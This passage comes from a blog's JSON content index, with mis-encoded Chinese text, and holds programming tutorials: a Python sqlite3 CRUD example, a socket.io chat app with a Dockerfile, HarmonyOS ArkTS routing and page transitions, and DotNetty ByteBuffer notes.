**æ˜“è¯»æ˜“å†™**ï¼šPythonçš„è¯­æ³•æ¸…æ™°ç®€æ´ï¼Œæ˜“äºç†è§£ï¼Œè¿™ä½¿å¾—å®ƒæˆä¸ºåˆå­¦è€…å’Œä¸“ä¸šå¼€å‘è€…éƒ½å–œçˆ±çš„è¯­è¨€ã€‚\\n\\n2. **å¹¿æ³›çš„åº“å’Œæ¡†æ¶**ï¼šPythonæœ‰å¤§é‡çš„ç¬¬ä¸‰æ–¹åº“å’Œæ¡†æ¶å¯ä¾›ä½¿ç”¨ï¼Œå¦‚NumPyã€Pandasã€TensorFlowç­‰ï¼Œè¿™äº›åº“ä½¿å¾—Pythonåœ¨æ•°æ®ç§‘å­¦ã€Webå¼€å‘ã€æœºå™¨å­¦ä¹ ç­‰é¢†åŸŸå…·æœ‰æ˜¾è‘—ä¼˜åŠ¿ã€‚\\n\\n3. **è·¨å¹³å°å…¼å®¹æ€§**ï¼šPythonå¯ä»¥åœ¨å¤šç§æ“ä½œç³»ç»Ÿä¸Šè¿è¡Œï¼ŒåŒ…æ‹¬Windowsã€macOSå’ŒLinuxã€‚\\n\\n4. **åŠ¨æ€ç±»å‹ç³»ç»Ÿ**ï¼šPythonæ˜¯åŠ¨æ€ç±»å‹çš„è¯­è¨€ï¼Œè¿™æ„å‘³ç€å¼€å‘è€…ä¸éœ€è¦åœ¨å£°æ˜å˜é‡æ—¶æŒ‡å®šå…¶ç±»å‹ï¼Œè¿™å¢åŠ äº†ç¼–ç¨‹çš„çµæ´»æ€§ã€‚\\n\\n### Pythonçš„å±€é™æ€§ï¼š\\n\\n1. **æ€§èƒ½**ï¼šä¸C++æˆ–Javaç­‰ç¼–è¯‘å‹è¯­è¨€ç›¸æ¯”ï¼ŒPythonåœ¨æ‰§è¡Œé€Ÿåº¦ä¸Šå¯èƒ½è¾ƒæ…¢ï¼Œå°¤å…¶æ˜¯åœ¨å¤„ç†å¤§é‡æ•°æ®æˆ–è¿›è¡Œå¤æ‚è®¡ç®—æ—¶ã€‚\\n\\n2. **ç±»å‹å®‰å…¨**ï¼šç”±äºPythonæ˜¯åŠ¨æ€ç±»å‹çš„ï¼Œè¿™å¯èƒ½å¯¼è‡´ç±»å‹é”™è¯¯åœ¨è¿è¡Œæ—¶æ‰è¢«å‘ç°ï¼Œè€Œä¸æ˜¯åœ¨ç¼–è¯‘é˜¶æ®µã€‚\\n\\n3. **ç§»åŠ¨å¼€å‘é™åˆ¶**ï¼šè™½ç„¶Pythonå¯ä»¥ç”¨äºå¼€å‘Webåº”ç”¨å’Œæ¡Œé¢åº”ç”¨ï¼Œä½†å®ƒåœ¨ç§»åŠ¨åº”ç”¨å¼€å‘ï¼ˆå¦‚iOSå’ŒAndroidåº”ç”¨ï¼‰æ–¹é¢å¹¶ä¸æ˜¯ä¸»æµé€‰æ‹©ã€‚\\n\\n4. **å†…å­˜æ¶ˆè€—**ï¼šPythonçš„å†…å­˜ç®¡ç†å¯èƒ½ä¸å¦‚æŸäº›å…¶ä»–è¯­è¨€é«˜æ•ˆï¼Œç‰¹åˆ«æ˜¯åœ¨å¤„ç†å¤§é‡æ•°æ®æ—¶ã€‚\\n\\n### ç»“è®ºï¼š\\n\\nPythonæ˜¯å¦æ˜¯æœ€å¥½çš„è¯­è¨€å–å†³äºå…·ä½“çš„ä½¿ç”¨åœºæ™¯å’Œéœ€æ±‚ã€‚å¯¹äºæ•°æ®ç§‘å­¦ã€Webå¼€å‘ã€è„šæœ¬ç¼–å†™å’Œè‡ªåŠ¨åŒ–ä»»åŠ¡ç­‰ï¼ŒPythonç¡®å®æ˜¯ä¸€ä¸ªå‡ºè‰²çš„é€‰æ‹©ã€‚ç„¶è€Œï¼Œåœ¨éœ€è¦é«˜æ€§èƒ½è®¡ç®—ã€å†…å­˜ä¼˜åŒ–æˆ–ç‰¹å®šäºç§»åŠ¨å¹³å°çš„å¼€å‘ä»»åŠ¡ä¸­ï¼Œå…¶ä»–è¯­è¨€å¯èƒ½æ›´ä¸ºåˆé€‚ã€‚\\n\\nå› æ­¤ï¼Œ\\&quot;Pythonæ˜¯æœ€å¥½çš„è¯­è¨€\\&quot;è¿™ä¸€è¯´æ³•æ˜¯ç‰‡é¢çš„ã€‚åœ¨é€‰æ‹©ç¼–ç¨‹è¯­è¨€æ—¶ï¼Œåº”æ ¹æ®é¡¹ç›®çš„å…·ä½“éœ€æ±‚å’Œä¸Šä¸‹æ–‡æ¥åšå‡ºå†³ç­–ã€‚&quot;,&quot;is_truncated&quot;:false,&quot;need_clear_history&quot;:false,&quot;finish_reason&quot;:&quot;normal&quot;,&quot;usage&quot;:&#123;&quot;prompt_tokens&quot;:3,&quot;completion_tokens&quot;:403,&quot;total_tokens&quot;:406&#125;&#125; pyhton sqlite123456789101112131415161718192021222324252627282930313233343536373839404142import sqlite3# 1. è¿æ¥åˆ° SQLite æ•°æ®åº“# å¦‚æœæ•°æ®åº“æ–‡ä»¶ä¸å­˜åœ¨ï¼Œä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ªconn = sqlite3.connect(&#x27;example.db&#x27;)# 2. åˆ›å»ºæ¸¸æ ‡å¯¹è±¡ï¼Œç”¨äºæ‰§è¡Œ SQL è¯­å¥cursor = conn.cursor()# 3. åˆ›å»ºä¸€ä¸ªè¡¨ï¼ˆå¦‚æœè¡¨ä¸å­˜åœ¨ï¼‰cursor.execute(&#x27;&#x27;&#x27; CREATE TABLE IF NOT EXISTS users ( id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT NOT NULL, age INTEGER NOT NULL )&#x27;&#x27;&#x27;)# 4. æ’å…¥æ•°æ®cursor.execute(&quot;INSERT INTO users (name, age) VALUES (?, ?)&quot;, (&#x27;py1&#x27;, 30))cursor.execute(&quot;INSERT INTO users (name, age) VALUES (?, ?)&quot;, (&#x27;py2&#x27;, 24))# æäº¤äº‹åŠ¡conn.commit()# 5. æŸ¥è¯¢æ•°æ®cursor.execute(&quot;SELECT * FROM users&quot;)rows = cursor.fetchall()for row in rows: print(row)# 6. æ›´æ–°æ•°æ®cursor.execute(&quot;UPDATE users SET age = ? WHERE name = ?&quot;, (31, &#x27;py1&#x27;))conn.commit()# 7. åˆ é™¤æ•°æ®cursor.execute(&quot;DELETE FROM users WHERE name = ?&quot;, (&#x27;py2&#x27;,))conn.commit()# 8. å…³é—­æ¸¸æ ‡å’Œè¿æ¥cursor.close()conn.close() End","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[],"author":"mu"},{"title":"socket.io","slug":"Nodejs-socketio","date":"2024-05-26T15:01:07.000Z","updated":"2025-03-16T17:39:05.723Z","comments":true,"path":"2024/05/26/Nodejs-socketio/","permalink":"https://banjinmei.github.io/2024/05/26/Nodejs-socketio/","excerpt":"","text":"server 1npm install express 1npm install socket.io 12345678910111213141516171819202122232425const express = require(&#x27;express&#x27;);const http = require(&#x27;http&#x27;);const socketIO = require(&#x27;socket.io&#x27;);const app = express();const server = http.createServer(app);const io = socketIO(server);io.on(&#x27;connection&#x27;, (socket) =&gt; &#123; console.log(&#x27;User connected&#x27;); socket.on(&#x27;chat message&#x27;, (msg) =&gt; &#123; console.log(&#x27;message: &#x27; + msg); io.emit(&#x27;chat message&#x27;, msg); // to all &#125;); socket.on(&#x27;disconnect&#x27;, () =&gt; &#123; console.log(&#x27;User disconnected&#x27;); &#125;);&#125;);server.listen(24525, () =&gt; &#123; console.log(&#x27;Node Server is running on port 24525&#x27;);&#125;); dockerdockerfile 12345678910111213FROM node:16-alpineWORKDIR /usr/src/appCOPY package*.json ./RUN npm ci --only=productionCOPY . .EXPOSE 24525CMD [&quot;node&quot;, &quot;skio.js&quot;] 12345678docker build -t nodeskio .docker run -p 24525:24525 -d nodeskio##login push#docker login#docker push your-image-name client 1npm install socket.io-client 12345678910111213141516171819202122232425262728293031323334const io = require(&#x27;socket.io-client&#x27;);const readline = require(&#x27;readline&#x27;);const rl = readline.createInterface(&#123; input: process.stdin, output: process.stdout&#125;);const socket = io.connect(&#x27;http://localhost:24525&#x27;);socket.on(&#x27;connect&#x27;, () =&gt; &#123; console.log(&#x27;Connected to server&#x27;);&#125;);// ç›‘å¬ä»æœåŠ¡å™¨æ¥æ”¶åˆ°çš„æ¶ˆæ¯socket.on(&#x27;chat message&#x27;, (msg) =&gt; &#123; console.log(&#x27;Message from server:&#x27;, msg);&#125;);// å¤„ç†ç”¨æˆ·è¾“å…¥å¹¶å‘é€åˆ°æœåŠ¡å™¨rl.on(&#x27;line&#x27;, (input) =&gt; &#123; if (input.toLowerCase() === &#x27;exit&#x27;) &#123; console.log(&#x27;Exiting...&#x27;); rl.close(); process.exit(0); &#125; else &#123; socket.emit(&#x27;chat message&#x27;, input); &#125;&#125;);// å¤„ç†å…³é—­äº‹ä»¶rl.on(&#x27;close&#x27;, () =&gt; &#123; socket.disconnect(); console.log(&#x27;Connection closed.&#x27;);&#125;); 1npm run ç®€å•èŠå¤©æœåŠ¡å™¨ç«¯ä»£ç ï¼ˆserver.jsï¼‰12345678910111213141516171819202122232425262728const express = require(&#x27;express&#x27;);const app = express();const http = require(&#x27;http&#x27;).Server(app);const io = require(&#x27;socket.io&#x27;)(http);// é™æ€æ–‡ä»¶æœåŠ¡ï¼Œç”¨äºæä¾›å®¢æˆ·ç«¯ HTML æ–‡ä»¶app.use(express.static(__dirname + &#x27;/public&#x27;));// ç›‘å¬å®¢æˆ·ç«¯è¿æ¥äº‹ä»¶io.on(&#x27;connection&#x27;, (socket) =&gt; &#123; console.log(&#x27;ä¸€ä¸ªç”¨æˆ·å·²è¿æ¥&#x27;); // ç›‘å¬å®¢æˆ·ç«¯å‘é€çš„æ¶ˆæ¯ socket.on(&#x27;chat message&#x27;, (msg) =&gt; &#123; // å¹¿æ’­æ¶ˆæ¯ç»™æ‰€æœ‰è¿æ¥çš„å®¢æˆ·ç«¯ io.emit(&#x27;chat message&#x27;, msg); &#125;); // ç›‘å¬å®¢æˆ·ç«¯æ–­å¼€è¿æ¥äº‹ä»¶ socket.on(&#x27;disconnect&#x27;, () =&gt; &#123; console.log(&#x27;ä¸€ä¸ªç”¨æˆ·å·²æ–­å¼€è¿æ¥&#x27;); &#125;);&#125;);const port = 3000;http.listen(port, () =&gt; &#123; console.log(`æœåŠ¡å™¨è¿è¡Œåœ¨ç«¯å£ $&#123;port&#125;`);&#125;); å®¢æˆ·ç«¯ä»£ç ï¼ˆpublic&#x2F;index.htmlï¼‰123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;ç®€å•èŠå¤©åº”ç”¨&lt;/title&gt; &lt;style&gt; body &#123; font-family: Arial, sans-serif; &#125; #messages &#123; list-style-type: none; margin: 0; padding: 0; &#125; #messages li &#123; padding: 5px 10px; &#125; #messages li:nth-child(odd) &#123; background: #eee; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;ul id=&quot;messages&quot;&gt;&lt;/ul&gt; &lt;form id=&quot;form&quot; action=&quot;&quot;&gt; &lt;input id=&quot;input&quot; autocomplete=&quot;off&quot; /&gt;&lt;button&gt;å‘é€&lt;/button&gt; &lt;/form&gt; &lt;script src=&quot;/socket.io/socket.io.js&quot;&gt;&lt;/script&gt; &lt;script&gt; // è¿æ¥åˆ°æœåŠ¡å™¨ var socket = io(); var form = document.getElementById(&#x27;form&#x27;); var input = document.getElementById(&#x27;input&#x27;); var messages = document.getElementById(&#x27;messages&#x27;); // ç›‘å¬è¡¨å•æäº¤äº‹ä»¶ form.addEventListener(&#x27;submit&#x27;, function (e) &#123; e.preventDefault(); if (input.value) &#123; // å‘é€æ¶ˆæ¯åˆ°æœåŠ¡å™¨ socket.emit(&#x27;chat message&#x27;, input.value); input.value = &#x27;&#x27;; &#125; &#125;); // ç›‘å¬æœåŠ¡å™¨å‘é€çš„æ¶ˆæ¯ socket.on(&#x27;chat message&#x27;, function (msg) &#123; var item = document.createElement(&#x27;li&#x27;); item.textContent = msg; messages.appendChild(item); window.scrollTo(0, document.body.scrollHeight); &#125;); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 12npm install express socket.ionode server.js è®¿é—®åº”ç”¨ï¼šæ‰“å¼€æµè§ˆå™¨ï¼Œè®¿é—® http://localhost:3000ã€‚å¯ä»¥æ‰“å¼€å¤šä¸ªæµè§ˆå™¨çª—å£æˆ–æ ‡ç­¾ï¼Œæ¨¡æ‹Ÿä¸åŒçš„ç”¨æˆ·è¿›è¡ŒèŠå¤©ã€‚ pingpong1234567891011121314151617// ç›‘å¬å®¢æˆ·ç«¯è¿æ¥äº‹ä»¶io.on(&#x27;connection&#x27;, (socket) =&gt; &#123; console.log(&#x27;ä¸€ä¸ªå®¢æˆ·ç«¯å·²è¿æ¥&#x27;); // ç›‘å¬å®¢æˆ·ç«¯å‘é€çš„ ping æ¶ˆæ¯ socket.on(&#x27;ping&#x27;, () =&gt; &#123; console.log(&#x27;æ”¶åˆ° ping æ¶ˆæ¯&#x27;); // å‘å®¢æˆ·ç«¯å‘é€ pong æ¶ˆæ¯ socket.emit(&#x27;pong&#x27;); &#125;); // ç›‘å¬å®¢æˆ·ç«¯æ–­å¼€è¿æ¥äº‹ä»¶ socket.on(&#x27;disconnect&#x27;, () =&gt; &#123; console.log(&#x27;ä¸€ä¸ªå®¢æˆ·ç«¯å·²æ–­å¼€è¿æ¥&#x27;); &#125;);&#125;); 12345678910111213141516171819202122232425262728293031323334353637&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;Ping - Pong ç¤ºä¾‹&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;button id=&quot;pingButton&quot;&gt;å‘é€ Ping&lt;/button&gt; &lt;p id=&quot;result&quot;&gt;&lt;/p&gt; &lt;script src=&quot;/socket.io/socket.io.js&quot;&gt;&lt;/script&gt; &lt;script&gt; // è¿æ¥åˆ°æœåŠ¡å™¨ var socket = io(); var pingButton = document.getElementById(&#x27;pingButton&#x27;); var result = document.getElementById(&#x27;result&#x27;); // ç›‘å¬æŒ‰é’®ç‚¹å‡»äº‹ä»¶ pingButton.addEventListener(&#x27;click&#x27;, function () &#123; console.log(&#x27;å‘é€ ping æ¶ˆæ¯&#x27;); // å‘æœåŠ¡å™¨å‘é€ ping æ¶ˆæ¯ socket.emit(&#x27;ping&#x27;); &#125;); // ç›‘å¬æœåŠ¡å™¨å‘é€çš„ pong æ¶ˆæ¯ socket.on(&#x27;pong&#x27;, () =&gt; &#123; console.log(&#x27;æ”¶åˆ° pong æ¶ˆæ¯&#x27;); result.textContent = &#x27;æ”¶åˆ° pong æ¶ˆæ¯&#x27;; &#125;); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; ç‚¹å‡» â€œå‘é€ Pingâ€ æŒ‰é’®ï¼Œé¡µé¢ä¸Šä¼šæ˜¾ç¤º â€œæ”¶åˆ° pong æ¶ˆæ¯â€ï¼ŒåŒæ—¶åœ¨æµè§ˆå™¨å’ŒæœåŠ¡å™¨çš„æ§åˆ¶å°ä¹Ÿä¼šæœ‰ç›¸åº”çš„æ—¥å¿—è¾“å‡ºã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[],"author":"mu"},{"title":"HarmonyOS Interface Router ArkTS ArkUI","slug":"HarmonyOS-Router","date":"2024-05-23T13:49:44.000Z","updated":"2024-12-15T05:10:21.283Z","comments":true,"path":"2024/05/23/HarmonyOS-Router/","permalink":"https://banjinmei.github.io/2024/05/23/HarmonyOS-Router/","excerpt":"","text":"11 ğŸ¬ï¸create12345678910111213141516@Componentexport default struct TitleBar &#123; build()&#123; Row()&#123; Text(&#x27;transition&#x27;) .fontSize(&#x27;30fp&#x27;) .fontColor(Color.White) &#125; .width(&#x27;100%&#x27;) .height(&#x27;8%&#x27;) .backgroundColor(&#x27;#4169E1&#x27;) .padding(&#123;left:10&#125;) &#125;&#125; ğŸï¸interface1234export interface IList&#123; title:string; url :string;&#125; 123456789101112131415161718@State listData:IList[]=[ // @State listData:Array&lt;IList&gt;=[ &#123; title:&#x27;in&#x27;, url:&#x27;pages/home1&#x27; &#125;, &#123; title:&#x27;scale&#x27;, url:&#x27;pages/home2&#x27; &#125;, &#123; title:&#x27;small&#x27;, url:&#x27;pages/home3&#x27; &#125;, &#123; title:&#x27;in&#x27;, url:&#x27;&#x27; &#125;] ğŸ’¡foreach12345678910ForEach(this.listData,( item: IList,index?:number)=&gt;&#123; //listitem Button(&#123;type:ButtonType.Capsule&#125;)&#123; Text(item.title) .fontSize(&#x27;35fp&#x27;) .fontColor(Color.White) &#125; //... &#125;) ğŸ”¦router1import router from &#x27;@ohos.router&#x27; ğŸ“¼mainpage1&quot;pages/home1&quot; ğŸ“¹ï¸onclick1234.onClick(()=&gt;&#123; //router router.pushUrl(&#123;url:item.url&#125;) &#125;) ğŸ“ºï¸setInterval123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354//home1 page1import router from &#x27;@ohos.router&#x27;@Entry@Componentstruct Index &#123; @State TOTAL_TIME:number = 6;//s @State FIRST_CT:number =3;//s aboutToAppear()&#123; //timer let timer= setInterval(()=&gt;&#123; this.TOTAL_TIME--; if(this.TOTAL_TIME===0)&#123; //end router.pushUrl(&#123; url:&quot;pages/Index&quot; &#125;) clearInterval(timer); &#125; &#125;,1000) &#125; build() &#123; Column() &#123; Row() &#123; if(this.TOTAL_TIME&gt;this.FIRST_CT)&#123; //1 Image($r(&#x27;app.media.t2&#x27;)) .objectFit(ImageFit.Contain) &#125;else if(this.TOTAL_TIME&lt;this.FIRST_CT) &#123; //2 Image($r(&#x27;app.media.bc&#x27;)) .objectFit(ImageFit.Contain) .width(&#x27;30%&#x27;) Text(&#x27; - m - &#x27;) .fontSize(&#x27;30fp&#x27;) &#125; &#125; .width(&#x27;100%&#x27;) .height(&#x27;100%&#x27;) .justifyContent(FlexAlign.Center) // Text(&#x27;in&#x27;) // .fontSize(&#x27;50fp&#x27;) &#125; .width(&#x27;100%&#x27;) &#125;&#125; â€‹ ğŸ“½ï¸TransitionEnter scale1234567891011121314151617181920//home2 page2 @State scale1: number = 1 @State opacity1: number = 1//... Column().scale(&#123; x: this.scale1 &#125;).opacity(this.opacity1)//... pageTransition() &#123; PageTransitionEnter(&#123; duration: 1200, curve: Curve.Linear &#125;) .onEnter((type: RouteType, progress: number) =&gt; &#123; this.scale1 = 1 this.opacity1 = progress &#125;) // onEnter (0% -- 100%) PageTransitionExit(&#123; duration: 1500, curve: Curve.Ease &#125;) .onExit((type: RouteType, progress: number) =&gt; &#123; this.scale1 = 1 - progress this.opacity1 = 1 &#125;) // onExit (0% -- 100%) &#125; â€‹ ğŸ¥SlideEffect.Left1234567pageTransition() &#123; PageTransitionEnter(&#123; duration: 1200 &#125;) .slide(SlideEffect.Left) PageTransitionExit(&#123; delay: 100 &#125;) .translate(&#123; x: 100.0, y: 100.0 &#125;) .opacity(0)&#125; â€‹","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"HarmonyOS","slug":"HarmonyOS","permalink":"https://banjinmei.github.io/tags/HarmonyOS/"}],"author":"mu"},{"title":"DotNetty ByteBuffer","slug":"DotNetty-ByteBuffer","date":"2024-05-23T13:47:10.000Z","updated":"2024-06-01T02:27:38.000Z","comments":true,"path":"2024/05/23/DotNetty-ByteBuffer/","permalink":"https://banjinmei.github.io/2024/05/23/DotNetty-ByteBuffer/","excerpt":"","text":"DotNettyæ˜¯ä¸€ä¸ªé«˜æ€§èƒ½çš„.NETç½‘ç»œé€šä¿¡æ¡†æ¶ï¼ŒåŸºäºNettyï¼Œæ”¯æŒTCPã€UDPã€HTTPã€WebSocketç­‰åè®®ã€‚é€‚ç”¨äºé«˜å¹¶å‘ã€ä½å»¶è¿Ÿåœºæ™¯ï¼Œå¦‚å®æ—¶é€šä¿¡ã€æ¸¸æˆæœåŠ¡å™¨ã€IoTåº”ç”¨åŠå¤§å‹åˆ†å¸ƒå¼ç³»ç»Ÿï¼Œé€šè¿‡å¼‚æ­¥I&#x2F;Oã€é›¶æ‹·è´ç­‰æŠ€æœ¯æå‡æ€§èƒ½ï¼Œå…·å¤‡æ˜“ç”¨æ€§ã€å¯æ‰©å±•æ€§ã€‚æ¶æ„ä¸Šï¼Œå›´ç»•Channelã€EventLoopã€ChannelPipelineã€ChannelHandlerContextè®¾è®¡ï¼ŒåŒ…å«Transportã€Codecã€Handlerç­‰æ¨¡å—ï¼Œç®€åŒ–ç½‘ç»œç¼–ç¨‹ï¼ŒåŠ é€Ÿæ•°æ®ä¼ è¾“å¤„ç†ã€‚ ByteBuffer ç”¨äºé«˜æ•ˆå¤„ç†å­—èŠ‚æ•°æ®ï¼Œå›ºå®šå®¹é‡ï¼Œé€šè¿‡allocateæˆ–wrapåˆ›å»ºã€‚æ¶‰åŠpositionå’Œlimitè¿½è¸ªè¯»å†™ä½ç½®ï¼Œæä¾›get&#x2F;putç­‰è¯»å†™æ–¹æ³•ï¼Œflipåˆ‡æ¢è¯»å†™æ¨¡å¼ï¼Œclearæ¸…ç©ºç¼“å†²åŒºï¼Œcompactç§»åŠ¨æ•°æ®å¹¶å‡†å¤‡ä¸‹ä¸€è½®è¯»å†™ï¼Œé€‚ç”¨äºé«˜æ€§èƒ½IOä¸ç½‘ç»œé€šä¿¡ã€‚. ä¼˜ç‚¹é›¶æ‹·è´é€šè¿‡å¤åˆç¼“å†²åŒºå®ç°ã€‚åŠ¨æ€å®¹é‡å¢é•¿ã€‚æ— éœ€flipåˆ‡æ¢è¯»å†™æ¨¡å¼ã€‚åˆ†ç¦»è¯»å†™ç´¢å¼•ã€‚å†…ç½®å¼•ç”¨è®¡æ•°ã€‚æ”¯æŒç¼“å†²åŒºæ± åŒ–ã€‚ä¼˜åŒ–ç½‘ç»œé€šä¿¡ä¸­çš„å­—èŠ‚å¤„ç†ã€‚ ç»“æ„readerIndex è¯»å–ï¼Œéšè¯»å¢ã€‚writerIndex å†™å…¥ï¼Œéšå†™å¢ã€‚capacityå®¹é‡ã€‚ ByteBufferå±æ€§readIndexï¼šä¸‹ä¸€ä¸ªè¯»ä½writeIndexï¼šä¸‹ä¸€ä¸ªå†™ä½ç½®capacityï¼šå®¹é‡0ï¼šç¼“å†²åŒºå¼€å§‹ä½ç½® å·²ç»è¯»å–çš„åŒºåŸŸï¼š[0,readerindex)å¯è¯»å–çš„åŒºåŸŸï¼š[readerindex,writerIndex)å¯å†™çš„åŒºåŸŸ: [writerIndex,capacity)è¯»å†™ç‹¬ç«‹ç´¢å¼•ï¼Œæ“ä½œå‘½ååŒºåˆ†ï¼ˆread&#x2F;writeè‡ªåŠ¨è¿›ï¼Œget&#x2F;setä¸å½±å“ç´¢å¼•ï¼‰ã€‚æ”¯æŒè®¾å®šæœ€å¤§å®¹é‡ï¼Œè¶…é™å†™æ“ä½œå°†æŠ›å¼‚å¸¸ï¼Œé»˜è®¤ä¸Šé™Integer.MAX_VALUEã€‚readerIndex writerIndex æœ¬è´¨ä¸ºçµæ´»é«˜æ•ˆå­—èŠ‚å®¹å™¨ å †ç¼“å†²åŒºæœ€å¸¸ç”¨çš„ ByteBuffer æ¨¡å¼æ˜¯å°†æ•°æ®å­˜å‚¨åœ¨å †ç©ºé—´ä¸­ã€‚è¿™ç§æ¨¡å¼è¢«ç§°ä¸ºæ”¯æ’‘æ•°ç»„ï¼ˆbacking arrayï¼‰ï¼Œå®ƒèƒ½åœ¨æ²¡æœ‰ä½¿ç”¨æ± åŒ–çš„æƒ…å†µä¸‹æä¾›å¿«é€Ÿçš„åˆ†é…å’Œé‡Šæ”¾ã€‚å¯ä»¥ç”± hasArray() æ¥åˆ¤æ–­æ£€æŸ¥ ByteBufferæ˜¯å¦ç”±æ•°ç»„æ”¯æ’‘ã€‚å¦‚æœä¸æ˜¯ï¼Œåˆ™è¿™æ˜¯ä¸€ä¸ªç›´æ¥ç¼“å†²åŒºã€‚ ç›´æ¥ç¼“å†²åŒºç›´æ¥ç¼“å†²åŒºæ˜¯å¦å¤–ä¸€ç§ ByteBuffer æ¨¡å¼ã€‚ç›´æ¥ç¼“å†²åŒºçš„ä¸»è¦ç¼ºç‚¹æ˜¯ï¼Œç›¸å¯¹äºåŸºäºå †çš„ç¼“å†²åŒºï¼Œå®ƒä»¬çš„åˆ†é…å’Œé‡Šæ”¾éƒ½è¾ƒä¸ºæ˜‚è´µã€‚ å¤åˆç¼“å†²åŒºå¤åˆç¼“å†²åŒº CompositeByteBufï¼Œå®ƒä¸ºå¤šä¸ª ByteBufferæä¾›ä¸€ä¸ªèšåˆè§†å›¾ã€‚æ¯”å¦‚ HTTP åè®®ï¼Œ åˆ†ä¸ºæ¶ˆæ¯å¤´å’Œæ¶ˆæ¯ä½“ï¼Œè¿™ä¸¤éƒ¨åˆ†å¯èƒ½ç”±åº”ç”¨ç¨‹åºçš„ä¸åŒæ¨¡å—äº§ç”Ÿï¼Œå„æœ‰å„çš„ ByteBufferï¼Œå°†ä¼šåœ¨æ¶ˆæ¯è¢«å‘é€çš„æ—¶å€™ç»„è£…ä¸ºä¸€ä¸ª ByteBufferï¼Œæ­¤æ—¶å¯ä»¥å°†è¿™ä¸¤ä¸ª ByteBufferèšåˆä¸ºä¸€ä¸ª CompositeByteBufï¼Œç„¶åä½¿ç”¨ç»Ÿä¸€å’Œé€šç”¨çš„ ByteBuffer API æ¥æ“ä½œã€‚ å¦‚ä½•åœ¨çš„ç¨‹åºä¸­è·å¾— ByteBuf çš„å®ä¾‹ï¼Œå¹¶ä½¿ç”¨å®ƒå‘¢ï¼ŸNetty æä¾›äº†ä¸¤ç§æ–¹å¼ ByteBufAllocator æ¥å£ByteBufAllocator åˆ†é…ä»»æ„ç±»å‹çš„ ByteBuffer å®ä¾‹ã€‚ buffer(): åŸºäºå †&#x2F;ç›´æ¥å†…å­˜ByteBufferã€‚heapBuffer(): ä»…å †å†…å­˜ã€‚directBuffer(): ä»…ç›´æ¥å†…å­˜ã€‚compositeBuffer(): å¯ç»„åˆå¤šä¸ªç¼“å†²åŒºï¼Œæ”¯æŒå †&#x2F;ç›´æ¥å†…å­˜ã€‚ioBuffer(): é€‚é…I&#x2F;Oæ“ä½œï¼Œä¼˜å…ˆç›´æ¥å†…å­˜(éœ€Unsafeæ”¯æŒ)ã€‚ByteBufAllocatorï¼šChannel ChannelHandlerContext Unpooled ç¼“å†²åŒº Unpooledå·¥å…·ç±»åŠ©åˆ›ByteBuffer buffer()ï¼šå †å†…å­˜ByteBuffer directBuffer()ï¼šç›´æ¥å†…å­˜ByteBuffer wrappedBuffer()ï¼šåŒ…è£…æ•°æ®çš„ByteBuffer copiedBuffer()ï¼šå¤åˆ¶æ•°æ®çš„ByteBuffer é€‚ç”¨èŒƒå›´å¹¿æ³›ï¼Œä¸ä»…é™äºNettyç½‘ç»œé¡¹ç›®ã€‚ 1IByteBuffer byteBuf = Unpooled.CopiedBuffer(&quot;hello,world!&quot;, Encoding.UTF8); ByteBufè®¿é—®&#x2F;è¯»å†™ç´¢å¼•ä»0å¼€å§‹è‡³capacity()-1ã€‚éšæœºè®¿é—®ï¼ˆget&#x2F;setï¼‰ä¸æ”¹ç´¢å¼•ï¼Œéœ€æ˜¾å¼è°ƒç”¨readerIndex()&#x2F;writerIndex()ç§»åŠ¨ã€‚é¡ºåºè®¿é—®åˆ†ä¸¤ç±»ï¼šget&#x2F;setï¼šå›ºå®šç´¢å¼•ï¼Œè¯»å†™æ•°æ®ä¸ç§»ä½ã€‚read&#x2F;writeï¼šè‡ªåŠ¨è°ƒæ•´readerIndex&#x2F;writerIndexã€‚ isReadable() å¦‚æœè‡³å°‘æœ‰ä¸€ä¸ªå­—èŠ‚å¯ä¾›è¯»å–ï¼Œåˆ™è¿”å› trueisWritable() å¦‚æœè‡³å°‘æœ‰ä¸€ä¸ªå­—èŠ‚å¯è¢«å†™å…¥ï¼Œåˆ™è¿”å› truereadableBytes() è¿”å›å¯è¢«è¯»å–çš„å­—èŠ‚æ•°writableBytes() è¿”å›å¯è¢«å†™å…¥çš„å­—èŠ‚æ•°capacity() è¿”å› ByteBuffer å¯å®¹çº³çš„å­—èŠ‚æ•°ã€‚åœ¨æ­¤ä¹‹åï¼Œå®ƒä¼šå°è¯•å†æ¬¡æ‰©å±•ç›´åˆ°è¾¾åˆ°maxCapacity()maxCapacity() è¿”å› ByteBuffer å¯ä»¥å®¹çº³çš„æœ€å¤§å­—èŠ‚æ•°hasArray() å¦‚æœ ByteBuffer ç”±ä¸€ä¸ªå­—èŠ‚æ•°ç»„æ”¯æ’‘ï¼Œåˆ™è¿”å› truearray() å¦‚æœ ByteBuffer ç”±ä¸€ä¸ªå­—èŠ‚æ•°ç»„æ”¯æ’‘åˆ™è¿”å›è¯¥æ•°ç»„ 